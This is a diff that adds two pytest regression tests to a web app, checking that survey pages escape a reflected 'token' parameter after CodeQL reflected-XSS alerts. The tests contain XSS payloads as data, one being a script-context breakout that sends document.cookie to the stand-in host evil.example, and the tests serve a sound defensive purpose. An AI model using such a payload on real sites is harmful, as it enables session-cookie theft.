@@ -67,6 +67,32 @@ def test_nasa_tlx_page_escapes_query_params(client):
     assert "</script><img" not in response.text
 
 
+def test_pulse_survey_escapes_token_in_script():
+    """
+    Reflected `token` must not break out of the <script> JS-string context
+    (CodeQL py/reflective-xss, code-scanning alert #74).
+    """
+    from app.main import _render_pulse_survey
+
+    payload = "'});fetch('https://evil.example/steal?c='+document.cookie);//"
+    response = _render_pulse_survey(payload)
+    assert payload not in response.body.decode()
+
+
+def test_deep_dive_survey_escapes_token_in_html():
+    """
+    Reflected `token` must be HTML-escaped in plain body text
+    (CodeQL py/reflective-xss, code-scanning alert #75).
+    """
+    from app.main import _render_deep_dive_survey
+
+    payload = "<script>alert(1)</script>"
+    response = _render_deep_dive_survey(payload)
+    body = response.body.decode()
+    assert payload not in body
+    assert "&lt;script&gt;" in body
+
+
 @pytest.mark.parametrize(
     "flow_state,valuable_work,cognitive_load,friction",
     [
